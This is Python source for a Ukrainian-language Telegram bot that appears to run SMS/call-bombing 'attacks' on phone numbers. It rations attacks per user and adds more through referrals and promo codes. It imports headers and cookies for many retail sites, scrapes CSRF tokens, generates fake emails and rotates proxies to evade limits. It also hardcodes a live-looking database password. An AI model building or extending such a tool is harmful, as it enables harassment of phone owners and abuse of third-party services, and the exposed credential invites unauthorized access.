from aiogram import *
import fake_useragent
import asyncio
import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext
from aiogram.types import Message
from markups import checkSubMenu
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.utils.exceptions import BotBlocked, UserDeactivated, ChatNotFound
from aiohttp import BasicAuth
from headers_main import (
    headers_dnipro, headers_citrus, headers_easypay, cookies_citrus, cookies_dnipro,
    headers_uvape, cookies_uvape, headers_terravape, cookies_terravape,
    headers_moyo, cookies_moyo, headers_sushiya, headers_zolota, cookies_zolota,
    headers_avtoria, cookies_avtoria, headers_elmir, cookies_elmir, headers_elmir_call,
    cookies_elmir_call
)
import asyncpg
import config
import aiohttp
import random
import string
import re
from bs4 import BeautifulSoup 
from datetime import datetime, timedelta
import urllib.parse
import itertools

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

ADMIN = [810944378]
channel_id = "-1003203193556"
message = ("Привіт.\nВаш вибір: ")
message = ("Привіт.\nВаш вибір: 👇")

db_config = {
    'user': 'postgres',
    'password': 'kXcfoihheRhCgwJUzBCJxNpdSTZIRvmL',
    'database': 'railway',
    'host': 'postgres.railway.internal',
    'port': '5432',
}

# Використовуємо пул з'єднань замість одного з'єднання
db_pool = None

attack_flags = {}
# Прапорці для розіграшів
giveaway_flags = {}

proxies_all = []
proxies_healthy = []
proxies_last_check = None
proxies_stats = []  # list of {entry, latency_ms}
proxies_usage = {}  # key -> count
proxies_usage_total = 0

last_status_msg = {}  # chat_id -> message_id

storage = MemoryStorage()
bot = Bot(token=config.token)
dp = Dispatcher(bot, storage=storage)

async def init_db():
    global db_pool
    db_pool = await asyncpg.create_pool(**db_config, min_size=5, max_size=20)
    
    # Отримуємо інформацію про бота для обробки згадок
    try:
        bot._me = await bot.get_me()
    except Exception as e:
        logging.error(f"Помилка отримання інформації про бота: {e}")
    
    async with db_pool.acquire() as conn:
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                name TEXT,
                username TEXT,
                block INTEGER DEFAULT 0,
                attacks_left INTEGER DEFAULT 6,
                promo_attacks INTEGER DEFAULT 0,
                referral_attacks INTEGER DEFAULT 0,
                unused_referral_attacks INTEGER DEFAULT 0,
                last_attack_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                referrer_id BIGINT,
                referral_count INTEGER DEFAULT 0,
                referral_notification_sent BOOLEAN DEFAULT FALSE
            );
            CREATE TABLE IF NOT EXISTS blacklist (
                phone_number TEXT PRIMARY KEY
            );
            CREATE TABLE IF NOT EXISTS referrals (
                id SERIAL PRIMARY KEY,
                referrer_id BIGINT,
                referred_id BIGINT,
                join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(referred_id)
            );
            CREATE TABLE IF NOT EXISTS user_messages (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                message_text TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS promocodes (
                id SERIAL PRIMARY KEY,
                code TEXT UNIQUE NOT NULL,
                attacks_count INTEGER NOT NULL,
                valid_until TIMESTAMP NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT TRUE
            );
            CREATE TABLE IF NOT EXISTS promo_activations (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                promo_code TEXT,
                activated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP NOT NULL,
                attacks_added INTEGER,
                UNIQUE(user_id, promo_code)
            );
        ''')
        
        # Додаємо нові колонки якщо їх немає
        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS promo_attacks INTEGER DEFAULT 0')
        except Exception as e:
            logging.error(f"Error adding promo_attacks column: {e}")
        
        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS referral_count INTEGER DEFAULT 0')
        except Exception as e:
            logging.error(f"Error adding referral_count column: {e}")
        
        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS referrer_id BIGINT')
        except Exception as e:
            logging.error(f"Error adding referrer_id column: {e}")

        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS referral_notification_sent BOOLEAN DEFAULT FALSE')
        except Exception as e:
            logging.error(f"Error adding referral_notification_sent column: {e}")
            
        try:
            await conn.execute('ALTER TABLE users ALTER COLUMN last_attack_date TYPE TIMESTAMP USING last_attack_date::timestamp')
        except Exception as e:
            logging.error(f"Error changing last_attack_date column type: {e}")

class Dialog(StatesGroup):
    spam = State()
    block_user = State()
    unblock_user = State()
    create_promo = State()
    create_promo_attacks = State()
    create_promo_hours = State()
    delete_promo = State()
    enter_promo = State()
    add_to_blacklist = State()

async def email():
    name_length = random.randint(6, 12)
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=name_length))
    generated_email = f"{name}@gmail.com"
    logging.info(f"email: {generated_email}")
    return generated_email

async def get_csrf_token(url, headers=None):
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            html = await response.text()
            soup = BeautifulSoup(html, "html.parser")

            csrf_token = soup.find("input", {"name": "_csrf"})
            if csrf_token:
                return csrf_token.get("value")
            
            meta_token = soup.find("meta", {"name": "csrf-token"})
            if meta_token:
                return meta_token.get("content")
            
            raise ValueError("CSRF-токен не знайдено.")

def get_cancel_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🛑 Зупинити атаку", callback_data="cancel_attack"))
    return keyboard

async def check_subscription_status(user_id):
    try:
        member = await bot.get_chat_member(chat_id=channel_id, user_id=user_id)
        if member.status in {"member", "administrator", "creator"}:
            return True
    except Exception as e:
        logging.error(f"Помилка: {e}")
    return False

async def anti_flood(*args, **kwargs):
    m = args[0]
    # Перевіряємо, що повідомлення з особистого чату
    if m.chat.type == 'private':
        await m.answer("Спокійно, не поспішай! 🐢")

# Оновлюємо клавіатури
profile_button = types.KeyboardButton('🎯 Почати атаку')
referal_button = types.KeyboardButton('🆘 Допомога')
referral_program_button = types.KeyboardButton('🎪 Запросити друга')
check_attacks_button = types.KeyboardButton('❓ Перевірити атаки')
profile_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True).add(profile_button, referal_button).add(referral_program_button, check_attacks_button)

admin_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
admin_keyboard.add("Надіслати повідомлення користувачам")
admin_keyboard.add("Додати номер до чорного списку")
admin_keyboard.add("Статистика бота")
admin_keyboard.add("Заблокувати користувача")
admin_keyboard.add("Розблокувати користувача")
admin_keyboard.add("Реферали")
admin_keyboard.add("Створити промокод")
admin_keyboard.add("Видалити промокод")
admin_keyboard.add("Список промокодів")
admin_keyboard.add("Перевірити проксі")
admin_keyboard.add("Назад")

def load_proxies_from_file(path: str = "proxy.txt"):
    result = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(":")
                if len(parts) != 4:
                    continue
                host, port, user, password = parts
                result.append({"host": host, "port": port, "user": user, "password": password})
    except Exception as e:
        logging.error(f"Proxy load error: {e}")
    return result

def build_proxy_params(entry):
    try:
        url = f"http://{entry['host']}:{entry['port']}"
        auth = BasicAuth(entry["user"], entry["password"]) if entry.get("user") else None
        return url, auth
    except Exception:
        return None, None

def proxy_key(entry):
    return f"{entry['host']}:{entry['port']}:{entry.get('user','')}"

async def check_single_proxy(entry):
    proxy_url, proxy_auth = build_proxy_params(entry)
    if not proxy_url:
        return None
    try:
        timeout = aiohttp.ClientTimeout(total=5)
        started = asyncio.get_event_loop().time()
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get("https://api.ipify.org?format=json", proxy=proxy_url, proxy_auth=proxy_auth) as resp:
                if resp.status == 200:
                    latency = (asyncio.get_event_loop().time() - started) * 1000.0
                    return {"entry": entry, "latency_ms": latency}
    except Exception:
        return None
    return None

async def check_and_update_proxies():
    global proxies_all, proxies_healthy, proxies_last_check, proxies_stats
    proxies_all = load_proxies_from_file()
    if not proxies_all:
        proxies_healthy = []
        proxies_stats = []
        proxies_last_check = datetime.now()
        return {"total": 0, "healthy": 0}
    sem = asyncio.Semaphore(50)
    async def worker(e):
        async with sem:
            return await check_single_proxy(e)
    tasks = [worker(e) for e in proxies_all]
    results = await asyncio.gather(*tasks, return_exceptions=False)
    healthy = [r for r in results if r]
    proxies_healthy = [r["entry"] for r in healthy]
    proxies_stats = healthy
    proxies_last_check = datetime.now()
    return {"total": len(proxies_all), "healthy": len(proxies_healthy)}

def proxy_status_text():
    total = len(proxies_all)
    healthy = len(proxies_healthy)
    when = proxies_last_check.strftime("%d.%m.%Y %H:%M:%S") if proxies_last_check else "—"
    return f"Проксі — всього: {total}\nРобочих: {healthy}\nОстання перевірка: {when}"

def generate_promo_code():
    """Генерує промокод з заголовних літер та цифр довжиною 10-20 символів"""
    length = random.randint(10, 20)
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choices(characters, k=length))

async def add_user(user_id: int, name: str, username: str, referrer_id: int = None):
    today = datetime.now().date()
    async with db_pool.acquire() as conn:
        await conn.execute(
            'INSERT INTO users (user_id, name, username, block, attacks_left, promo_attacks, referral_attacks, unused_referral_attacks, last_attack_date, referrer_id) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10) ON CONFLICT (user_id) DO NOTHING',
            user_id, name, username, 0, 6, 0, 0, 0, today, referrer_id
        )
        
        if referrer_id:
            await conn.execute(
                'INSERT INTO referrals (referrer_id, referred_id) VALUES ($1, $2) ON CONFLICT (referred_id) DO NOTHING',
                referrer_id, user_id
            )
            
            await conn.execute(
                'UPDATE users SET referral_attacks = referral_attacks + 10, referral_count = referral_count + 1 WHERE user_id = $1',
                referrer_id
            )

            await conn.execute(
                'UPDATE users SET referral_attacks = referral_attacks + 10 WHERE user_id = $1',
                user_id
            )

            try:
                ref_name = username or name or f"User{user_id}"
                await bot.send_message(
                    referrer_id,
                    f"🎉 За вашим посиланням приєднався новий користувач: <a href='tg://user?id={user_id}'>{ref_name}</a>\n🚀 Ви отримали +10 додаткових атак!",
                    parse_mode='HTML'
                )
            except Exception as e:
                logging.error(f"Error notifying referrer {referrer_id}: {e}")
        
        profile_link = f'<a href="tg://user?id={user_id}">{name}</a>'
        for admin_id in ADMIN:
            try:
                await bot.send_message(admin_id, f"Новий користувач зареєструвався у боті:\nІм'я: {profile_link}", parse_mode='HTML')
            except Exception as e:
                logging.error(f"Помилка при відправленні адміну {admin_id}: {e}")

async def startuser(message:types.Message):
    user_id = message.from_user.id
    if await check_subscription_status(user_id):
        await message.answer(message, reply_markup=profile_keyboard)
    else:
        await message.answer("Ви не підписані", reply_markup=checkSubMenu)

@dp.message_handler(commands=['start'])
async def start(message: Message):
    # Перевіряємо, що команда з особистого чату
    if message.chat.type != 'private':
        return  # Ігноруємо команду /start в групах
    
    user_id = message.from_user.id
    args = message.get_args()
    referrer_id = None
    if args and args.isdigit():
        referrer_id = int(args)
        if referrer_id == user_id:
            referrer_id = None
        else:
            async with db_pool.acquire() as conn:
                referrer_exists = await conn.fetchval('SELECT 1 FROM users WHERE user_id = $1', referrer_id)
                if not referrer_exists:
                    referrer_id = None
    
    if not await check_subscription_status(user_id):
        # Зберігаємо повідомлення /start з аргументом для подальшої обробки після підписки
        async with db_pool.acquire() as conn:
            await conn.execute(
                'INSERT INTO user_messages (user_id, message_text) VALUES ($1, $2)',
                user_id, message.text
            )
        logging.info(f"Збережена інформація про реферальне посилання: user_id={user_id}, referrer_id={referrer_id}")
        await message.answer("Для використання бота потрібно підписатися на наш канал!", reply_markup=checkSubMenu)
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow('SELECT block FROM users WHERE user_id = $1', user_id)
    
    if message.from_user.id in ADMIN:
        await message.answer('Введіть команду /admin', reply_markup=profile_keyboard)
    else:
        if result is None:
            # Новий користувач — додаємо з реферальним id, якщо є
            await add_user(message.from_user.id, message.from_user.full_name, message.from_user.username, None)
            # Після додавання користувача нараховуємо реферальні атаки, якщо є реферер
            if referrer_id:
                await process_referral(referrer_id, message.from_user.id, message.from_user.username, message.from_user.full_name)
        
        if result and result['block'] == 1:
            await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
            return
        
        welcome_text = f"🎉 Вітаю, {message.from_user.first_name}!\n\n"
        welcome_text = 'Використовуючи бота ви автоматично погоджуєтесь з <a href="https://telegra.ph/Umovi-vikoristannya-10-26-2">умовами використання</a>\n\n'

        
        await bot.send_message(user_id, welcome_text, reply_markup=profile_keyboard, parse_mode='HTML')

@dp.callback_query_handler(text="subchanneldone")
async def process_subscription_confirmation(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    if await check_subscription_status(user_id):
        async with db_pool.acquire() as conn:
            user_exists = await conn.fetchval('SELECT 1 FROM users WHERE user_id = $1', user_id)
            
            if not user_exists:
                referrer_id = None
                try:
                    last_start_message = await conn.fetchval(
                        'SELECT message_text FROM user_messages WHERE user_id = $1 AND message_text LIKE \'/start%\' ORDER BY timestamp DESC LIMIT 1',
                        user_id
                    )
                    
                    logging.info(f"Останнє повідомлення /start: {last_start_message}")
                    
                    if last_start_message and ' ' in last_start_message:
                        args = last_start_message.split(' ')[1]
                        if args.isdigit():
                            referrer_id = int(args)
                            if referrer_id == user_id:
                                referrer_id = None
                            else:
                                referrer_exists = await conn.fetchval('SELECT 1 FROM users WHERE user_id = $1', referrer_id)
                                if not referrer_exists:
                                    referrer_id = None
                    
                    logging.info(f"Знайдено referrer_id: {referrer_id}")
                except Exception as e:
                    logging.error(f"Помилка при отриманні referrer_id: {e}")
                
                await add_user(callback_query.from_user.id, callback_query.from_user.full_name, callback_query.from_user.username, None)
                # Після додавання користувача нараховуємо реферальні атаки, якщо є реферер
                if referrer_id:
                    await process_referral(referrer_id, callback_query.from_user.id, callback_query.from_user.username, callback_query.from_user.full_name)
                
                if referrer_id:
                    await conn.execute(
                        'UPDATE users SET referral_count = referral_count + 1 WHERE user_id = $1',
                        referrer_id
                    )
                    
                    await conn.execute(
                        'INSERT INTO referrals (referrer_id, referred_id) VALUES ($1, $2) ON CONFLICT (referred_id) DO NOTHING',
                        referrer_id, user_id
                    )
                    
                    logging.info(f"Друга зараховано: referrer_id={referrer_id}, referred_id={user_id}")
                    
                    referrer_data = await conn.fetchrow(
                        'SELECT referral_count, referral_notification_sent FROM users WHERE user_id = $1',
                        referrer_id
                    )
                    
                    if (referrer_data and 
                        referrer_data['referral_count'] >= 20 and 
                        not referrer_data['referral_notification_sent']):
                        for admin_id in ADMIN:
                            try:
                                await bot.send_message(
                                    admin_id,
                                    f"🎉 Користувач <a href='tg://user?id={referrer_id}'>@{callback_query.from_user.username or 'User'}</a> досягнув 20 рефералів!",
                                    parse_mode='HTML'
                                )
                                await conn.execute(
                                    'UPDATE users SET referral_notification_sent = TRUE WHERE user_id = $1',
                                    referrer_id
                                )
                            except Exception as e:
                                logging.error(f"Помилка при повідомленні адміну {admin_id}: {e}")
                
                welcome_text = f"🎉 Ласкаво просимо, {callback_query.from_user.first_name}!\n\n"
                welcome_text += "🎯 Ви успішно підписалися і тепер можете користуватися ботом.\n\n"
                
                await callback_query.message.edit_text(welcome_text, parse_mode='HTML')
                await callback_query.message.answer("Оберіть дію:", reply_markup=profile_keyboard)
            else:
                welcome_text = f"🎉 З поверненням, дуже на тебе чекали, {callback_query.from_user.first_name}!\n\n"
                welcome_text = 'Використовуючи бота ви автоматично погоджуєтесь з <a href="https://telegra.ph/Umovi-vikoristannya-10-26-2">умовами використання</a>\n\n'

                
                await callback_query.message.edit_text(welcome_text, parse_mode='HTML')
                await callback_query.message.answer("Оберіть дію:", reply_markup=profile_keyboard)
    else:
        await callback_query.answer("Ви ще не підписалися на канал!", show_alert=True)

@dp.message_handler(commands=['admin'])
async def admin(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer(f'{message.from_user.first_name}, оберіть дію👇', reply_markup=admin_keyboard)
    else:
        await message.answer('☝️Ви не адміністратор')

@dp.message_handler(text="Перевірити проксі")
async def admin_check_and_report_proxies(message: Message):
    if message.from_user.id not in ADMIN:
        await message.answer("Недостатньо прав.")
        return
    placeholder = await message.answer("Перевіряю проксі…")
    stats = await check_and_update_proxies()
    lines = [f"Перевірено: {stats['total']}. Робочих: {stats['healthy']}.", ""]
    total_usage = sum(proxies_usage.values()) or 1
    for item in proxies_stats:
        e = item["entry"]
        key = f"{e['host']}:{e['port']}:{e['user']}"
        cnt = proxies_usage.get(key, 0)
        pct = round(cnt * 100.0 / total_usage, 1)
        lines.append(f"• {e['host']}:{e['port']} ({e['user']}) — {int(item['latency_ms'])} ms — навантаження: {pct}%")
    try:
        await bot.edit_message_text("\n".join(lines), chat_id=placeholder.chat.id, message_id=placeholder.message_id)
    except Exception:
        await message.answer("\n".join(lines))

# ПРОМОКОДЫ - АДМИН ПАНЕЛЬ

@dp.message_handler(text="Створити промокод")
async def create_promo_start(message: Message):
    if message.from_user.id in ADMIN:
        await Dialog.create_promo_attacks.set()
        await message.answer("🎁 <b>Створення промокоду</b>\n\nВведіть кількість атак для промокоду:\n\n💡 Ви можете написати <b>Скасувати</b> для відміни.", parse_mode="html")
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.create_promo_attacks)
async def create_promo_attacks(message: Message, state: FSMContext):
    text = message.text.strip()
    
    # Перевіряємо на скасування
    if text.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=profile_keyboard)
        return
    
    try:
        attacks = int(text)
        if attacks <= 0:
            await message.answer("❌ Кількість атак має бути більше 0.\n\nВведіть число або напишіть <b>Скасувати</b> для відміни.", parse_mode="html")
            return
        
        await state.update_data(attacks=attacks)
        await Dialog.create_promo_hours.set()
        await message.answer("⏰ Введіть строк дії промокоду в годинах (час, протягом якого користувачі зможуть ввести промокод) ЧАС МАЄ БУТИ +3 ГОДИНИ ВІД ПОТРІБНОГО:\n\n💡 Напишіть <b>Скасувати</b> для відміни.", parse_mode="html")
    except ValueError:
        await message.answer("❌ Введіть коректне число.\n\nСпробуйте ще раз або напишіть <b>Скасувати</b> для відміни.", parse_mode="html")

@dp.message_handler(state=Dialog.create_promo_hours)
async def create_promo_hours(message: Message, state: FSMContext):
    text = message.text.strip()
    
    # Перевіряємо на скасування
    if text.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=profile_keyboard)
        return
    
    try:
        hours = int(text)
        if hours <= 0:
            await message.answer("❌ Кількість годин має бути більше 0.\n\nВведіть число або напишіть <b>Скасувати</b> для відміни.", parse_mode="html")
            return
        
        data = await state.get_data()
        attacks = data['attacks']
        
        # Генеруємо унікальний промокод
        async with db_pool.acquire() as conn:
            while True:
                promo_code = generate_promo_code()
                existing = await conn.fetchval('SELECT 1 FROM promocodes WHERE code = $1', promo_code)
                if not existing:
                    break
            
            # Створюємо промокод
            valid_until = datetime.now() + timedelta(hours=hours)
            await conn.execute(
                'INSERT INTO promocodes (code, attacks_count, valid_until) VALUES ($1, $2, $3)',
                promo_code, attacks, valid_until
            )
        
        await message.answer(
            f"✅ Промокод створено!\n\n"
            f"🎁 Код: <code>{promo_code}</code>\n"
            f"⚔️ Атак: {attacks}\n"
            f"⏰ Діє до: {valid_until.strftime('%d.%m.%Y %H:%M')}\n"
            f"📝 Промокод можна ввести протягом {hours} годин\n"
            f"🕐 Після активації діє 24 години",
            parse_mode='HTML',
            reply_markup=profile_keyboard
        )
        
        await state.finish()
    except ValueError:
        await message.answer("❌ Введіть коректне число.\n\nСпробуйте ще раз або напишіть <b>Скасувати</b> для відміни.", parse_mode="html")

@dp.message_handler(text="Видалити промокод")
async def delete_promo_start(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            promos = await conn.fetch('SELECT code, attacks_count, valid_until FROM promocodes WHERE is_active = TRUE ORDER BY created_at DESC')
        
        if not promos:
            await message.answer("Немає активних промокодів для видалення.")
            return
        
        text = "🗑️ Активні промокоди:\n\n"
        for promo in promos:
            text += f"• <code>{promo['code']}</code> - {promo['attacks_count']} атак (до {promo['valid_until'].strftime('%d.%m.%Y %H:%M')})\n"
        
        text += "\nВведіть код промокоду для видалення:\n\n💡 Ви можете написати <b>Скасувати</b> для відміни."
        
        await Dialog.delete_promo.set()
        await message.answer(text, parse_mode='HTML')
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.delete_promo)
async def delete_promo_process(message: Message, state: FSMContext):
    promo_code = message.text.strip()
    
    # Перевіряємо на скасування
    if promo_code.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=profile_keyboard)
        return
    
    promo_code = promo_code.upper()
    
    async with db_pool.acquire() as conn:
        # Перевіряємо існування промокоду
        promo = await conn.fetchrow('SELECT * FROM promocodes WHERE code = $1 AND is_active = TRUE', promo_code)
        
        if not promo:
            await message.answer("❌ Промокод не знайдено або вже видалено.\n\nВведіть код або напишіть <b>Скасувати</b> для відміни.", parse_mode="html")
            return
        
        # Деактивуємо промокод
        await conn.execute('UPDATE promocodes SET is_active = FALSE WHERE code = $1', promo_code)
    
    await message.answer(f"✅ Промокод <code>{promo_code}</code> успішно видалено!", parse_mode='HTML', reply_markup=profile_keyboard)
    await state.finish()

@dp.message_handler(text="Список промокодів")
async def list_promos(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            promos = await conn.fetch('''
                SELECT code, attacks_count, valid_until, created_at, is_active,
                       (SELECT COUNT(*) FROM promo_activations WHERE promo_code = code) as used_count
                FROM promocodes 
                ORDER BY created_at DESC
            ''')
        
        if not promos:
            await message.answer("Промокодів поки що немає.")
            return
        
        text = "📋 <b>Всі промокоди:</b>\n\n"
        
        for promo in promos:
            status = "🟢 Активний" if promo['is_active'] else "🔴 Видалено"
            if promo['is_active'] and datetime.now() > promo['valid_until']:
                status = "⏰ Закінчився"
            
            text += f"• <code>{promo['code']}</code>\n"
            text += f"  ⚔️ Атак: {promo['attacks_count']}\n"
            text += f"  📅 Створено: {promo['created_at'].strftime('%d.%m.%Y %H:%M')}\n"
            text += f"  ⏰ До: {promo['valid_until'].strftime('%d.%m.%Y %H:%M')}\n"
            text += f"  👥 Використано: {promo['used_count']} разів\n"
            text += f"  📊 Статус: {status}\n\n"
        
        await message.answer(text, parse_mode='HTML')
    else:
        await message.answer("Недостатньо прав.")

# ПРОМОКОДЫ - ПОЛЬЗОВАТЕЛИ

@dp.message_handler(text='Промокод 🎁')
async def promo_handler(message: types.Message):
    # Перевіряємо, що повідомлення з особистого чату
    if message.chat.type != 'private':
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("Для використання бота потрібно натиснути /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
        return

    if not await check_subscription_status(user_id):
        await message.answer("Ви відписалися від каналу. Підпишіться, щоб продовжити використання бота.", reply_markup=checkSubMenu)
        return
    
    await Dialog.enter_promo.set()
    await message.answer("🎁 Введіть промокод:")

@dp.message_handler(state=Dialog.enter_promo)
async def process_promo(message: Message, state: FSMContext):
    user_id = message.from_user.id
    promo_code = message.text.strip().upper()
    
    async with db_pool.acquire() as conn:
        # Перевіряємо існування та активність промокоду
        promo = await conn.fetchrow('''
            SELECT * FROM promocodes 
            WHERE code = $1 AND is_active = TRUE AND valid_until > $2
        ''', promo_code, datetime.now())
        
        if not promo:
            await message.answer("❌ Промокод недійсний або закінчився строк його дії.")
            await state.finish()
            return
        
        # Перевіряємо, чи не використовував користувач вже цей промокод
        already_used = await conn.fetchval('''
            SELECT 1 FROM promo_activations 
            WHERE user_id = $1 AND promo_code = $2
        ''', user_id, promo_code)
        
        if already_used:
            await message.answer("❌ Ви вже використали цей промокод.")
            await state.finish()
            return
        
        # Активуємо промокод
        expires_at = datetime.now() + timedelta(hours=24)
        
        await conn.execute('''
            INSERT INTO promo_activations (user_id, promo_code, expires_at, attacks_added)
            VALUES ($1, $2, $3, $4)
        ''', user_id, promo_code, expires_at, promo['attacks_count'])
        
        # Додаємо атаки користувачу
        await conn.execute('''
            UPDATE users SET promo_attacks = promo_attacks + $1 WHERE user_id = $2
        ''', promo['attacks_count'], user_id)
    
    await message.answer(
        f"🎉 Промокод успішно активовано!\n\n"
        f"⚔️ Додано атак: {promo['attacks_count']}\n"
        f"⏰ Діє до: {expires_at.strftime('%d.%m.%Y %H:%M')}\n\n"
        f"💡 Атаки від промокоду згорять при наступній щоденній роздачі атак.",
        parse_mode='HTML'
    )
    
    await state.finish()

# Остальные обработчики...

@dp.message_handler(text="Статистика бота")
async def bot_stats(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            # Отримуємо загальну кількість користувачів
            total_users = await conn.fetchval('SELECT COUNT(*) FROM users')
            
            # Отримуємо кількість активних користувачів (тих, хто не заблокував бота)
            active_users = 0
            users = await conn.fetch('SELECT user_id FROM users')
            
            for user in users:
                try:
                    # Перевіряємо, чи може бот надіслати повідомлення користувачу
                    await bot.send_chat_action(user['user_id'], 'typing')
                    active_users += 1
                except (BotBlocked, UserDeactivated, ChatNotFound):
                    continue
                except Exception as e:
                    logging.error(f"Помилка при перевірці користувача {user['user_id']}: {e}")
                    continue
            
            # Отримуємо кількість заблокованих користувачів
            blocked_users = await conn.fetchval('SELECT COUNT(*) FROM users WHERE block = 1')
            
            # Отримуємо кількість користувачів з рефералами
            users_with_referrals = await conn.fetchval('SELECT COUNT(*) FROM users WHERE referral_count > 0')
            
            # Отримуємо загальну кількість рефералів
            total_referrals = await conn.fetchval('SELECT COUNT(*) FROM referrals')
            
            # Отримуємо кількість користувачів, які досягли 20 рефералів
            vip_users = await conn.fetchval('SELECT COUNT(*) FROM users WHERE referral_count >= 20')
            
            # Статистика промокодов
            total_promos = await conn.fetchval('SELECT COUNT(*) FROM promocodes')
            active_promos = await conn.fetchval('SELECT COUNT(*) FROM promocodes WHERE is_active = TRUE AND valid_until > $1', datetime.now())
            promo_activations = await conn.fetchval('SELECT COUNT(*) FROM promo_activations')
        
        message_text = (
            f"📊 <b>Статистика бота</b>\n\n"
            f"👥 Всього користувачів: {total_users}\n"
            f"✅ Активних користувачів: {active_users}\n"
            f"🚫 Заблокованих користувачів: {blocked_users}\n"
            f"📈 Користувачів з рефералами: {users_with_referrals}\n"
            f"🔗 Всього рефералів: {total_referrals}\n"
            f"⭐ VIP користувачів (20+ рефералів): {vip_users}\n\n"
            f"🎁 <b>Промокоди:</b>\n"
            f"📋 Всього створено: {total_promos}\n"
            f"🟢 Активних: {active_promos}\n"
            f"✨ Активацій: {promo_activations}"
        )
        
        await message.answer(message_text, parse_mode="HTML")
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(text='Надіслати повідомлення користувачам')
async def broadcast_prompt(message: Message):
    if message.from_user.id in ADMIN:
        await Dialog.spam.set()
        await message.answer('Введіть повідомлення для користувачів:')
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.spam, content_types=[types.ContentType.TEXT, types.ContentType.PHOTO, types.ContentType.VIDEO, types.ContentType.DOCUMENT])
async def broadcast_message(message: Message, state: FSMContext):
    text = message.text if message.text else ""
    content_type = "text" if message.text else "unknown"

    if message.photo:
        content_type = "photo"
        photo_id = message.photo[-1].file_id
    elif message.video:
        content_type = "video"
        video_id = message.video.file_id
    elif message.document:
        content_type = "document"
        document_id = message.document.file_id

    async with db_pool.acquire() as conn:
        users = await conn.fetch('SELECT user_id FROM users')
    
    success_count = 0
    error_count = 0

    for user in users:
        user_id = user['user_id']
        try:
            if content_type == "text":
                await bot.send_message(user_id, text)
            elif content_type == "photo":
                await bot.send_photo(user_id, photo_id, caption=text)
            elif content_type == "video":
                await bot.send_video(user_id, video_id, caption=text)
            elif content_type == "document":
                await bot.send_document(user_id, document_id, caption=text)
            success_count += 1
        except BotBlocked:
            logging.error(f"Бота заблокував користувач {user_id}. Пропускаємо його.")
            error_count += 1
        except UserDeactivated:
            logging.error(f"Користувач {user_id} деактивував аккаунт. Пропускаємо його.")
            error_count += 1
        except ChatNotFound:
            logging.error(f"Чат з користувачем {user_id} не знайдено. Пропускаємо його.")
            error_count += 1
        except Exception as e:
            logging.error(f"Помилка при відправленні повідомлення користувачу {user_id}: {str(e)}")
            error_count += 1

    await message.answer(f'Повідомлення відправлено!\nУспішно: {success_count}\nПомилок: {error_count}')
    await state.finish()

@dp.message_handler(text="Додати номер до чорного списку")
async def add_to_blacklist_start(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer("🔴 <b>Додавання номера до чорного списку</b>\n\nВведіть номер телефону:\nПриклад: <i>🇺🇦380xxxxxxxxx</i>\n\n💡 Ви можете написати <b>Скасувати</b> для відміни операції.", parse_mode="html")
        await Dialog.add_to_blacklist.set()
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.add_to_blacklist)
async def add_to_blacklist_process(message: Message, state: FSMContext):
    phone = message.text.strip()
    
    # Перевіряємо на скасування
    if phone.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=profile_keyboard)
        return
    
